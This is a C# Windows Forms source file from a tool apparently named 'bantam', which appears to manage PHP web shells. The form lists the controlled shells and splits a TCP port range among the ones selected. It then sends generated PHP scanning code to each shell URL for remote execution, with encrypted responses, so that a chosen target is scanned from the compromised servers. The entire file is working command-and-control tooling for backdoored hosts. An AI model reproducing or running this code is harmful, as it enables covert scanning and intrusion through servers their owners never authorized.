using System;
using System.Windows.Forms;

using bantam.Classes;

namespace bantam.Forms
{
    public partial class DistributedPortScanner : Form
    {
        /// <summary>
        /// Max number of TCP ports
        /// </summary>
        private const int PORT_MAX = 65535;

        /// <summary>
        /// Default constructor
        /// </summary>
        public DistributedPortScanner()
        {
            InitializeComponent();
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void DistributedScanner_Load(object sender, EventArgs e)
        {
            foreach(var shell in BantamMain.Shells) {
                checkedListBoxShells.Items.Add(shell.Key);
            }
        }

        /// <summary>
        /// Main Distributed scanning routine
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private async void btnScan_Click(object sender, EventArgs e)
        {
            if (string.IsNullOrEmpty(textBoxTarget.Text)) {
                lblStatus.Text = "Invalid IP/Url.";
                return;
            }

            string target = textBoxTarget.Text;

            if (!Helper.IsValidIPv4(target)
            && !Helper.IsValidUri(target)) {
                lblStatus.Text = "Invalid IP/Url.";
                return;
            }

            if (string.IsNullOrEmpty(textBoxStartPort.Text)
             || string.IsNullOrEmpty(textBoxEndPort.Text)) {
                lblStatus.Text = "Invalid port.";
                return;
            }

            int startPort = Convert.ToInt32(textBoxStartPort.Text);
            int endPort = Convert.ToInt32(textBoxEndPort.Text);

            if (startPort > endPort 
             || endPort <= 0 || startPort <= 0
             || startPort > PORT_MAX || endPort > PORT_MAX) {
                lblStatus.Text = "Invalid port.";
                return;
            }

            btnScan.Enabled = false;

            string windowTitle = "Open Ports ( " + target + " )";
            RichTextBox rtb = GuiHelper.RichTextBoxDialog(windowTitle, string.Empty);

            int shellsCount = checkedListBoxShells.CheckedItems.Count;
            int portsPerShell = ((endPort - startPort) / shellsCount);

            int iter = 1;
            foreach(var checkedItem in checkedListBoxShells.CheckedItems) {
                string portsCode = string.Empty;
                string scannedRange = string.Empty;
                if (iter == shellsCount) {
                    if (iter == 1) {
                        scannedRange = startPort.ToString() + ", " + (endPort).ToString();
                        portsCode = "$ports = range("+ scannedRange + ");";
                    } else {
                        scannedRange = (((iter - 1) * portsPerShell) + 1).ToString() + ", " + (endPort).ToString();
                        portsCode = "$ports = range(" + scannedRange + ");";
                    }
                } else {
                    if (iter == 1) {
                        scannedRange = startPort.ToString() + ", " + (iter * portsPerShell).ToString();
                        portsCode = "$ports = range(" + scannedRange + ");";
                    } else {
                        scannedRange = (((iter - 1) * portsPerShell) + 1).ToString() + ", " + (iter * portsPerShell).ToString();
                        portsCode = "$ports = range("+ scannedRange + ");";
                    }
                    iter++;
                }

                bool encryptResponse = true;
                string shellUrl = checkedListBoxShells.GetItemText(checkedItem);

                string responseText = "[" + shellUrl + "] - returned ports (" + scannedRange + ") - \r\n";
                string phpCode = PhpBuilder.PortScanner(target, portsCode, encryptResponse);

                lblStatus.Text = "Scanning.";

                BantamMain.ExecutePHPCodeDisplayInRichTextBox(shellUrl, phpCode, windowTitle, encryptResponse, (int)CryptoHelper.RESPONSE_ENCRYPTION_TYPES.OPENSSL, false, rtb, responseText);

                btnScan.Enabled = true;
            }
        }

        private void textBoxStartPort_KeyPress(object sender, KeyPressEventArgs e)
        {
            if (!char.IsControl(e.KeyChar) && !char.IsDigit(e.KeyChar)) {
                e.Handled = true;
            }
        }

        private void textBoxEndPort_KeyPress(object sender, KeyPressEventArgs e)
        {
            if (!char.IsControl(e.KeyChar) && !char.IsDigit(e.KeyChar)) {
                e.Handled = true;
            }
        }

        private void textBoxTarget_TextChanged(object sender, EventArgs e)
        {
            if (string.IsNullOrEmpty(textBoxTarget.Text)) {
                btnScan.Enabled = false;
            } else {
                btnScan.Enabled = true;
            }
        }

        private void selectAllToolStripMenuItem_Click(object sender, EventArgs e)
        {
            for(int i = 0; i < checkedListBoxShells.Items.Count; i++) {
                checkedListBoxShells.SetItemCheckState(i, CheckState.Checked);
            }
        }

        private void deSelectAllToolStripMenuItem_Click(object sender, EventArgs e)
        {
            for (int i = 0; i < checkedListBoxShells.Items.Count; i++) {
                checkedListBoxShells.SetItemCheckState(i, CheckState.Unchecked);
            }
        }
    }
}
